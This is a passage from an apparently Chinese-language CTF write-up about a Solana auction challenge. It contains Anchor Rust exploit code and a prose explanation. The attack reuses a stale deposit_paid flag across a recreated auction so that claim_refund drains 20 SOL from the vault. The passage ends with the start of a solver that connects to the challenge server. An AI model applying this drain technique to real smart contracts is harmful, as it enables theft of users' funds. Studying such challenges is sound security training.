</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=l>signer</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>challenge::cpi::claim_refund(cpi_ctx)?;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span>}<span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span>{<span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>let cpi_ctx = CpiContext::new(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=l>ctx.accounts.challenge.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=l>challenge::cpi::accounts::ClaimWinner {</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>winner</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.user.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>auction</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.auction.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>bidder_state</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.bidder_state_user.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>auctioneer</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.user.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>vault</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.vault.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>system_program</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.system_program.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span>}<span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>challenge::cpi::claim_winner(cpi_ctx)?;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span>}<span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span>{<span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>let cpi_ctx = CpiContext::new(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=l>ctx.accounts.challenge.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=l>challenge::cpi::accounts::CloseAuction {</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>auctioneer</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.user.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>auction</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.auction.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span>}<span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>challenge::cpi::close_auction(cpi_ctx)?;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span>}<span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=l>msg!(&#34;Phase 1 Done&#34;);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=l>Ok(())</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span>}<span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>fn phase_2(ctx</span><span class=p>:</span><span class=w> </span><span class=cp>&amp;Context&lt;Initialize&gt;)</span><span class=w> </span>-<span class=l>&gt; Result&lt;()&gt; {</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=l>let now = Clock::get()?.unix_timestamp;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=l>let end_time_1 = now + 1000; </span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=l>let deadline_1 = end_time_1 + 60 * 60 * 24 * 8; </span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=l>let start_high = 100_000_000_000u64; </span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=l>let buy_now_high = 200_000_000_000u64; </span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=l>let increment_high = 1_000_000_000u64; </span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span>{<span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>let cpi_ctx = CpiContext::new(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=l>ctx.accounts.challenge.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=l>challenge::cpi::accounts::CreateAuction {</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>auctioneer</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.user.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>auction</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.auction.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>system_program</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.system_program.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span>}<span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>challenge::cpi::create_auction(cpi_ctx, 1338, &#34;Drain&#34;.to_string(), buy_now_high, start_high, increment_high, end_time_1, deadline_1)?;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span>}<span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span>{<span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>let cpi_ctx = CpiContext::new(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=l>ctx.accounts.challenge.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=l>challenge::cpi::accounts::PlaceBid {</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>bidder</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.user.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>auction</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.auction.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>vault</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.vault.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>bidder_state</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.bidder_state_user.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>system_program</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.system_program.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span>}<span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>challenge::cpi::place_bid(cpi_ctx, start_high)?;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span>}<span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span>{<span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>let seeds = &amp;[b&#34;helper&#34;.as_ref(), &amp;[ctx.bumps.pda_bidder]];</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>let signer = &amp;[&amp;seeds[..]];</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>let cpi_ctx = CpiContext::new_with_signer(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=l>ctx.accounts.challenge.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=l>challenge::cpi::accounts::PlaceBid {</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>bidder</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.pda_bidder.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>auction</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.auction.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>vault</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.vault.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>bidder_state</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.bidder_state_pda.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>system_program</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.system_program.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span>}<span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=l>signer</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>challenge::cpi::place_bid(cpi_ctx, buy_now_high)?;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span>}<span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span>{<span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>let cpi_ctx = CpiContext::new(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=l>ctx.accounts.challenge.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=l>challenge::cpi::accounts::ClaimRefund {</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>bidder</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.user.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>auction</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.auction.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>bidder_state</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.bidder_state_user.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>vault</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.vault.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>system_program</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.system_program.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span>}<span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>challenge::cpi::claim_refund(cpi_ctx)?;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span>}<span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=l>msg!(&#34;Phase 2 Done&#34;);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=l>Ok(())</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span>}<span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>fn phase_3(ctx</span><span class=p>:</span><span class=w> </span><span class=cp>&amp;Context&lt;Initialize&gt;)</span><span class=w> </span>-<span class=l>&gt; Result&lt;()&gt; {</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=l>let buy_now_admin = 10_000_000_000u64; </span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span>{<span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>let cpi_ctx = CpiContext::new(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=l>ctx.accounts.challenge.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=l>challenge::cpi::accounts::PlaceBid {</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>bidder</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.user.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>auction</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.auction_admin.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>vault</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.vault.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>bidder_state</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.bidder_state_admin.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>system_program</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.system_program.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span>}<span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>challenge::cpi::place_bid(cpi_ctx, buy_now_admin)?;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span>}<span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span>{<span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>let cpi_ctx = CpiContext::new(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=l>ctx.accounts.challenge.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=l>challenge::cpi::accounts::ClaimWinner {</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>winner</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.user.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>auction</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.auction_admin.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>bidder_state</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.bidder_state_admin.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>auctioneer</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.admin.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>vault</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.vault.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>system_program</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.system_program.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span>}<span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>challenge::cpi::claim_winner(cpi_ctx)?;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span>}<span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=l>msg!(&#34;Phase 3 Done&#34;);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=l>Ok(())</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span>}<span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c>#[derive(Accounts)]</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=l>pub struct Initialize&lt;&#39;info&gt; {</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c>#[account(mut)]</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>pub user</span><span class=p>:</span><span class=w> </span><span class=l>Signer&lt;&#39;info&gt;,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c>#[account(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>mut, </span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>seeds = [b&#34;helper&#34;], </span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>bump</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=l>)]</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>pub pda_bidder</span><span class=p>:</span><span class=w> </span><span class=l>AccountInfo&lt;&#39;info&gt;,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>pub challenge</span><span class=p>:</span><span class=w> </span><span class=l>Program&lt;&#39;info, challenge::program::Challenge&gt;,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c>#[account(mut)]</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>pub auction</span><span class=p>:</span><span class=w> </span><span class=l>AccountInfo&lt;&#39;info&gt;, </span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c>#[account(mut)]</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>pub auction_admin</span><span class=p>:</span><span class=w> </span><span class=l>AccountInfo&lt;&#39;info&gt;, </span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c>#[account(mut)]</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>pub admin</span><span class=p>:</span><span class=w> </span><span class=l>AccountInfo&lt;&#39;info&gt;,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c>#[account(mut)]</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>pub bidder_state_user</span><span class=p>:</span><span class=w> </span><span class=l>AccountInfo&lt;&#39;info&gt;, </span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c>#[account(mut)]</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>pub bidder_state_pda</span><span class=p>:</span><span class=w> </span><span class=l>AccountInfo&lt;&#39;info&gt;, </span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c>#[account(mut)]</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>pub bidder_state_admin</span><span class=p>:</span><span class=w> </span><span class=l>AccountInfo&lt;&#39;info&gt;,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c>#[account(mut)]</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>pub vault</span><span class=p>:</span><span class=w> </span><span class=l>AccountInfo&lt;&#39;info&gt;,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>pub system_program</span><span class=p>:</span><span class=w> </span><span class=l>Program&lt;&#39;info, System&gt;,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span>}<span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>创建一个自定义拍卖（ID 1338），设置极低的起拍价（0 SOL），此时保证金为 0。玩家参与竞拍。由于保证金为 0，玩家无需支付 SOL，但合约将玩家的 deposit_paid 设为 true 。利用辅助账户（PDA）出价更高并结束该拍卖，或者直接关闭拍卖，保留玩家的 BidderState 状态。</p><p>重建 同一个拍卖（ID 1338），但这次设置极高的参数（如起拍价 100 SOL -> 保证金 20 SOL）。玩家再次竞拍。合约检查发现 deposit_paid 已经是 true，因此 跳过 了 20 SOL 的转账检查。利用辅助账户（PDA）出以 10 SOL赢得拍卖，使玩家成为输家。玩家调用 claim_refund 。合约读取当前拍卖的保证金设置（20 SOL），将这笔钱从 Vault 转给玩家。玩家凭空获得了 20 SOL。</p><p>此时玩家余额已超过 0.2 SOL。直接参与管理员的拍卖（ID 1），支付保证金。以10 SOL直接赢得拍卖。调用 claim_winner 获取 Flag。</p><p>最后修改main.rs获得flag</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Rust data-lang=Rust><span class=line><span class=cl><span class=k>use</span><span class=w> </span><span class=n>anchor_lang</span>::<span class=p>{</span><span class=n>system_program</span><span class=p>,</span><span class=w> </span><span class=n>InstructionData</span><span class=p>,</span><span class=w> </span><span class=n>ToAccountMetas</span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>use</span><span class=w> </span><span class=n>solana_program</span>::<span class=n>pubkey</span>::<span class=n>Pubkey</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>use</span><span class=w> </span><span class=n>std</span>::<span class=n>net</span>::<span class=n>TcpStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>use</span><span class=w> </span><span class=n>std</span>::<span class=p>{</span><span class=n>error</span>::<span class=n>Error</span><span class=p>,</span><span class=w> </span><span class=n>fs</span><span class=p>,</span><span class=w> </span><span class=n>io</span>::<span class=n>prelude</span>::<span class=o>*</span><span class=p>,</span><span class=w> </span><span class=n>io</span>::<span class=n>BufReader</span><span class=p>,</span><span class=w> </span><span class=kt>str</span>::<span class=n>FromStr</span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>fn</span> <span class=nf>get_line</span><span class=o>&lt;</span><span class=n>R</span>: <span class=nc>Read</span><span class=o>&gt;</span><span class=p>(</span><span class=n>reader</span>: <span class=kp>&amp;</span><span class=nc>mut</span><span class=w> </span><span class=n>BufReader</span><span class=o>&lt;</span><span class=n>R</span><span class=o>&gt;</span><span class=p>)</span><span class=w> </span>-&gt; <span class=nb>Result</span><span class=o>&lt;</span><span class=nb>String</span><span class=p>,</span><span class=w> </span><span class=nb>Box</span><span class=o>&lt;</span><span class=k>dyn</span><span class=w> </span><span class=n>Error</span><span class=o>&gt;&gt;</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=k>mut</span><span class=w> </span><span class=n>line</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=nb>String</span>::<span class=n>new</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>reader</span><span class=p>.</span><span class=n>read_line</span><span class=p>(</span><span class=o>&amp;</span><span class=k>mut</span><span class=w> </span><span class=n>line</span><span class=p>)</span><span class=o>?</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>ret</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>line</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>.</span><span class=n>split</span><span class=p>(</span><span class=sc>&#39;:&#39;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>.</span><span class=n>nth</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>.</span><span class=n>ok_or</span><span class=p>(</span><span class=s>&#34;invalid input&#34;</span><span class=p>)</span><span class=o>?</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>.</span><span class=n>trim</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>.</span><span class=n>to_string</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nb>Ok</span><span class=p>(</span><span class=n>ret</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>fn</span> <span class=nf>main</span><span class=p>()</span><span class=w> </span>-&gt; <span class=nb>Result</span><span class=o>&lt;</span><span class=p>(),</span><span class=w> </span><span class=nb>Box</span><span class=o>&lt;</span><span class=k>dyn</span><span class=w> </span><span class=n>Error</span><span class=o>&gt;&gt;</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=k>mut</span><span class=w> </span><span class=n>stream</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>TcpStream</span>::<span class=n>connect</span><span class=p>(</span><span class=s>&#34;223.6.249.127:14317&#34;</span><span class=p>)</span><span class=o>?</span><span class=p>;</span><span class=w>
